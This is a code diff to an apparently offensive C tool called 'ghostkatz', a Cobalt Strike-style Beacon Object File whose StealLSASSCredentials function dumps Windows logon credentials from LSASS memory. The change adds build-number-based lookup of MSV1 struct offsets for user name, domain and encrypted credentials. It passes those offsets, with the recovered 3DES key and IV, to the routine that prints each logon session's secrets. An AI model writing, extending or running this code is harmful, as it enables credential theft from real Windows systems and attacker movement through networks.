@@ -5,6 +5,7 @@
 #include "ghostkatz.h"
 #include "defs.h"
 #include "lsass.h"
+#include "lsass_offsets.h"
 
 DWORD64 GetDataSectionOffset(char* TargetModule)
 {
@@ -240,6 +241,22 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
         }
         BeaconPrintf(CALLBACK_OUTPUT, "[+] LogonSessionList found: 0x%llx\n", LogonSessionListHead);
         
+        // Look up version-specific MSV struct offsets from the same table used for signature selection
+        int MSV_UserNameOffset   = 0x90;
+        int MSV_DomainOffset     = 0xA0;
+        int MSV_CredsOffset      = 0x108;
+        int lslArraySize = sizeof(LsassLogonSessionListArray) / sizeof(LsassLogonSessionListArray[0]);
+        for (int li = lslArraySize - 1; li >= 0; li--)
+        {
+            if (dBuildNumber >= LsassLogonSessionListArray[li].WindowsVersion)
+            {
+                MSV_UserNameOffset = LsassLogonSessionListArray[li].UserNameOffset;
+                MSV_DomainOffset   = LsassLogonSessionListArray[li].DomainOffset;
+                MSV_CredsOffset    = LsassLogonSessionListArray[li].CredentialsOffset;
+                break;
+            }
+        }
+
         BeaconFormatPrintf(&outputbuffer, "\n===== [ LogonSessionList Information ] =====\n");
         BeaconFormatPrintf(&outputbuffer, "[i] LogonSessionListBase: 0x%llx\n\n", LogonSessionListHead);
 
@@ -248,7 +265,7 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
         for (int li = 0; li < 32; li++)
         {
             DWORD64 SubListHead = LogonSessionListHead + (DWORD64)li * 0x10;
-            DisplayLogonSessionListInformation(hFile, SubListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector);
+            DisplayLogonSessionListInformation(hFile, SubListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector, MSV_UserNameOffset, MSV_DomainOffset, MSV_CredsOffset);
         }
         FreeLibrary(hModule);
     }
